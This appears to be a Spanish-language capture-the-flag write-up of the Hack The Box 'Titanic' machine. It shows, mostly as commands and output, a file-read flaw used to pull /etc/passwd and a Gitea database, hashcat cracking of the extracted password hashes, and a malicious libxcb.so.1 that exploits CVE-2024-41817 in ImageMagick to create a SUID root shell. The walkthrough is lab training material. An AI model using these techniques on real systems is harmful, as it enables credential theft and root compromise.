---
title: Titanic
description: Titanic es una máquina Linux de dificultad fácil que ejecuta un servidor Apache escuchando en el puerto 80. El sitio web en ese puerto promociona los servicios del legendario barco Titanic y permite a los usuarios reservar viajes. Tras realizar fuzzing, se identifica un segundo vHost que apunta a un servidor Gitea. Este servidor permite el registro de nuevos usuarios, y al explorar los repositorios disponibles, se encuentra información relevante, incluyendo la ubicación de una carpeta de datos de Gitea montada, que está siendo utilizada por un contenedor Docker. De vuelta al sitio original, se descubre que la funcionalidad de reservas es vulnerable a un exploit de lectura arbitraria de archivos. Combinando esta vulnerabilidad con la ruta identificada en Gitea, es posible descargar localmente la base de datos SQLite de Gitea. Esta base contiene credenciales hasheadas del usuario developer, las cuales pueden ser crackeadas. Con esas credenciales, se puede acceder al sistema remoto mediante SSH. La enumeración del sistema de archivos revela un script en el directorio /opt/scripts que se ejecuta cada minuto. Este script utiliza el binario magick para procesar imágenes específicas. La versión de magick presente es vulnerable a una vulnerabilidad de ejecución arbitraria de código, identificada como CVE-2024-41817. La explotación exitosa de esta vulnerabilidad permite escalar privilegios y obtener acceso como usuario root.
date: 2025-02-18
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-titanic/titanic_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - tcp
  - ssh
  - http
  - lfi
  - data_leaks
  - arbitrary_file_read
  - fuzzing_web
  - git
  - password_attacks
  - cve
  - arbitrary_code_execution
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ ping -c 1 10.10.11.55
PING 10.10.11.55 (10.10.11.55) 56(84) bytes of data.
64 bytes from 10.10.11.55: icmp_seq=1 ttl=63 time=177 ms

--- 10.10.11.55 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 176.993/176.993/176.993/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 10.10.11.55 -n -Pn -oG nmap1
Host: 10.10.11.55 ()	Status: Up
Host: 10.10.11.55 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///	Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ sudo nmap -sCV -p22,80 -vvv 10.10.11.55 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73039c76eb04f1fec9e980449c7f1346 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGZG4yHYcDPrtn7U0l+ertBhGBgjIeH9vWnZcmqH0cvmCNvdcDY/ItR3tdB4yMJp0ZTth5itUVtlJJGHRYAZ8Wg=
|   256 d5bd1d5e9a861ceb88634d5f884b7e04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDT1btWpkcbHWpNEEqICTtbAcQQitzOiPOmc3ZE0A69Z
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://titanic.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```terminal
/home/kali/Documents/htb/machines/titanic:-$ echo '10.10.11.55\ttitanic.htb' | sudo tee -a /etc/hosts
10.10.11.55     titanic.htb

/home/kali/Documents/htb/machines/titanic:-$ whatweb titanic.htb
http://titanic.htb [200 OK] Bootstrap[4.5.2], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/3.0.3 Python/3.10.12], IP[10.10.11.55], JQuery, Python[3.10.12], Script, Title[Titanic - Book Your Ship Trip], Werkzeug[3.0.3]
```

---
## Web Analysis

El dominio principal expone una aplicación desarrollada en Python. El servicio corresponde a una plataforma de reservas para el Titanic.

![](assets/img/htb-writeup-titanic/titanic1_1.png)

La funcionalidad más destacada es un botón llamado `Book your trip`, que habilita un formulario para cargar los datos del pasajero.

![](assets/img/htb-writeup-titanic/titanic1_2.png)

Al enviar el formulario, el servidor responde con un archivo `.json` descargable que contiene los datos ingresados manualmente.

![](assets/img/htb-writeup-titanic/titanic1_3.png)

---

El proceso de fuzzing de subdominios revela un host adicional activo bajo el nombre `dev.titanic.htb`.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -ic -t 200 -c -fw 20
Dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 223ms]

/home/kali/Documents/htb/machines/titanic:-$ sudo sed -i '$d' /etc/hosts
/home/kali/Documents/htb/machines/titanic:-$ echo '10.10.11.55\ttitanic.htb\tdev.titanic.htb' | sudo tee -a /etc/hosts
```

Actualizo el archivo `/etc/hosts` para incluir la resolución del nuevo subdominio. Y al consultar `dev.titanic.htb` con el navegador, la aplicación responde con una instancia de Gitea funcionando.

![](assets/img/htb-writeup-titanic/titanic1_4.png)

Dentro del Gitea, el usuario `developer` mantiene un repositorio público llamado `docker-config` que contiene dos carpetas relevantes, cada una con un archivo `docker-compose.yml`.

Por otro lado, el archivo de configuración para el servicio MySQL expone credenciales en texto claro.

![](assets/img/htb-writeup-titanic/titanic1_5.png)

El archivo correspondiente al servicio Gitea revela el path local donde persisten los datos del contenedor.

![](assets/img/htb-writeup-titanic/titanic1_6.png)

---
## Vulnerability Exploitation

La función vulnerable se encuentra en el parámetro `ticket` del endpoint `/download`. Este recurso es invocado automáticamente luego de enviar el formulario de reserva a través de `/book`, el cual redirige hacia `/download?ticket=` para descargar un archivo JSON con los datos ingresados.

{% include embed/video.html src='assets/img/htb-writeup-titanic/titanic2_1.webm' types='webm' title='' autoplay=true loop=true muted=true %}

El parámetro `ticket` permite especificar una ruta de archivo local, lo que habilita un Local File Inclusion.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ curl -s http://titanic.htb/download?ticket=/etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Para localizar rutas sensibles relacionadas con Gitea, reviso la [documentación oficial](https://docs.gitea.com/installation/install-with-docker#customization). Allí se especifica que la configuración personalizada queda almacenada en `/data/gitea/conf/app.ini`, o bien dentro del volumen nombrado como `/var/lib/docker/volumes/gitea_gitea/_data/gitea/conf/app.ini`.

A partir del archivo `gitea/docker-compose.yml` presente en el repositorio `docker-config` de Gitea, concluyo que la ruta al archivo `app.ini` es `/home/developer/gitea/data/gitea/conf/app.ini`.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ curl --path-as-is http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini
...[snip]...
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable
...[snip]...
```

El valor de `PATH` dentro del bloque `[database]` indica que la base de datos de Gitea reside en `/home/developer/gitea/data/gitea/gitea.db`. Asi que, descargo el archivo directamente.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ wget http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db -O gitea.db
```

Inspecciono las credenciales almacenadas y extraigo los campos name, salt y passwd de la tabla user. Y convierto los valores al formato PBKDF2-HMAC-SHA256.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ sqlite3 gitea.db "select name,salt,passwd from user" 
administrator|2d149e5fbd1b20cf31db3e3c6a28fc9b|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
developer|8bf3e3452b78544f8bee9400d6936d34|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56

/home/kali/Documents/htb/machines/titanic:-$ sqlite3 gitea.db "select name,salt,passwd from user" | while read data; do name=$(echo $data | cut -d'|' -f1); salt=$(echo $data | cut -d '|' -f2 | xxd -r -p | base64); digest=$(echo $data | cut -d '|' -f3 | xxd -r -p | base64); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee hashes.txt
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

Una vez generado con hashes validos, ejecuto el ataque de diccionario.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ hashcat --show hashes.txt --username
    # | Name                                            | Category
======+=================================================+==============================
10900 | PBKDF2-HMAC-SHA256                              | Generic KDF

/home/kali/Documents/htb/machines/titanic:-$ hashcat hashes.txt --username /usr/share/wordlists/rockyou.txt
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

Con la contraseña recuperada `25282528`, inicio sesión por SSH como el usuario `developer`.

```terminal
/home/kali/Documents/htb/machines/titanic:-$ ssh developer@titanic.htb
developer@titanic.htb's password: 25282528

developer@titanic:~$ id
uid=1000(developer) gid=1000(developer) groups=1000(developer)

developer@titanic:~$ cat user.txt
```

---
## Privilege Escalation

Al enumerar usuarios con shells válidos, confirmo que `developer` es el único usuario con una shell además de `root`.

```terminal
developer@titanic:~$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```

Buscando directorios con permisos de lectura y ejecución, encuentro varias rutas fuera de las habituales, entre ellas `/opt/scripts`.

```terminal
developer@titanic:~$ find / -type d -perm 755 2>/dev/null | grep -vE 'proc|run|home|sys|usr|snap|dev|boot|var|etc'
/
/srv
/opt
/opt/scripts
/opt/app
/media
/mnt
```

Dentro de `/opt/scripts` detecto el archivo `identify_images.sh`, propiedad de `root` y con permisos de ejecución para otros.

```terminal
developer@titanic:~$ ls -al /opt/scripts/identify_images.sh
-rwxr-xr-x 1 root root 167 Feb  3 17:11 /opt/scripts/identify_images.sh
```

El script, lo que hace es cambiar al directorio `/opt/app/static/assets/images`, limpiar el archivo `metadata.log` y ejecutar `magick identify` sobre todas las imágenes `.jpg` del directorio, redirigiendo la salida a ese mismo log.

```terminal
developer@titanic:~$ cat /opt/scripts/identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Al verificar la versión de magick, confirmo que está ejecutando `ImageMagick 7.1.1-35` la cual, es vulnerable a [CVE-2024-41817](https://nvd.nist.gov/vuln/detail/cve-2024-41817). Según [ImageMagick/GHSA-8rxc-922v-phg8](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8), esta vulnerabilidad permite la ejecución arbitraria de código cuando el binario intenta cargar la biblioteca `libxcb.so.1` desde el directorio actual, en lugar de las rutas estándar del sistema. Permitiendo inyectar una librería manipulada que se ejecute con los privilegios del proceso, en este caso, como `root`.

```terminal
developer@titanic:~$ /usr/bin/magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

Aprovecho este comportamiento compilando una biblioteca `libxcb.so.1` maliciosa que copia `/bin/bash` hacia `/tmp/bash` con el bit SUID activado.

```terminal
developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/bash; chmod u+s /tmp/bash");
    exit(0);
}
EOF
```

Luego, cuando el script `identify_images.sh` es ejecutado automáticamente, el binario magick carga mi `libxcb.so.1`, activando el payload y la creación del binario con permisos SUID.

```terminal
developer@titanic:/opt/app/static/assets/images$ ls -al /tmp/bash
-rwsr-xr-x  1 root      root      1396520 Jul  2 16:14 bash
```

Ejecuto el binario de forma privilegiada accediendo a una shell como `root`.

```terminal
developer@titanic:/opt/app/static/assets/images$ /tmp/bash -p

bash-5.1# id
uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer)

bash-5.1# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/648" target="_blank">Titanc Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }
